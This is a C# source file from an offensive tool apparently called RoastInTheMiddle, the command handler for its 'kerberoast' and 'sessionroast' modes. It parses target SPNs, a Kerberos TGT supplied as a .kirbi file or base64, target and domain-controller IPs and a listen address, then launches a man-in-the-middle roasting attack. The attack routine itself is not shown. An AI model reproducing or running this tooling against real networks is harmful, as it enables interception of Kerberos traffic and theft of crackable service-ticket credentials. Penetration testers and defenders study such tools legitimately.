using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using RoastInTheMiddle.Lib;
using RoastInTheMiddle.Lib.Krb;

namespace RoastInTheMiddle.Command
{
    public class Roast
    {
        public static void Execute(Dictionary<string, string> arguments)
        {
            List<string> spns = new List<string>();
            string listenIP = null;
            List<IPAddress> targets = null;
            List<IPAddress> dcIPs = null;
            Program.verbose = arguments.ContainsKey("/verbose");

            if (arguments.ContainsKey("/listenip"))
            {
                listenIP = arguments["/listenip"];
            }

            if (arguments.ContainsKey("/spns"))
            {
                if (System.IO.File.Exists(arguments["/spns"]))
                {
                    string fileContent = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(arguments["/spns"]));
                    foreach (string s in fileContent.Split('\n'))
                    {
                        if (!String.IsNullOrEmpty(s))
                        {
                            spns.Add(s.Trim());
                        }
                    }
                }
                else
                {
                    foreach (string s in arguments["/spns"].Split(','))
                    {
                        spns.Add(s);
                    }
                }
            }

            if (Program.command.Equals("kerberoast") && spns.Count < 1)
            {
                Console.WriteLine("[X] '/spns' argument is required to execute this command.");
                Usage.Print();
                return;
            }

            if (arguments.ContainsKey("/tgt"))
            {
                string kirbi64 = arguments["/tgt"];
                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    Program.tgt = new KRB_CRED(kirbiBytes);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    Program.tgt = new KRB_CRED(kirbiBytes);
                }
                else if (Program.command.Equals("sessionroast"))
                {
                    Console.WriteLine("[X] /tgt:X must either be a .kirbi file or a base64 encoded .kirbi");
                    return;
                }
            }
            else if (Program.command.Equals("sessionroast"))
            {
                Console.WriteLine("[X] the 'sessionroast' command requires the /tgt:X argument");
                Usage.Print();
                return;
            }

            if (arguments.ContainsKey("/targets"))
            {
                targets = new List<IPAddress>();
                foreach (var target in arguments["/targets"].Split(','))
                {
                    try
                    {
                        targets.Add(IPAddress.Parse(target));
                    }
                    catch
                    {
                        Console.WriteLine($"[!] Unable to parse IP {target}, skipping");
                    }
                }
                if (targets.Count < 1)
                {
                    Console.WriteLine($"[X] No viable targets set!");
                    return;
                }
            }
            if (arguments.ContainsKey("/dcs"))
            {
                dcIPs = new List<IPAddress>();
                foreach (var dc in arguments["/dcs"].Split(','))
                {
                    try
                    {
                        dcIPs.Add(IPAddress.Parse(dc));
                    }
                    catch
                    {
                        Console.WriteLine($"[!] Unable to parse IP {dc}, skipping");
                    }
                }
                if (dcIPs.Count < 1)
                {
                    Console.WriteLine($"[X] No viable DCs set!");
                    return;
                }
            }

            if (!string.IsNullOrWhiteSpace(listenIP))
            {
                Console.WriteLine($"[*] Starting RitM {Program.command} attack");
                RitM.Run(listenIP, targets, dcIPs, spns).Wait();
                Console.WriteLine($"[*] Finished RitM {Program.command} attack");
            }
            else
            {
                Usage.Print();
            }
        }
    }
}
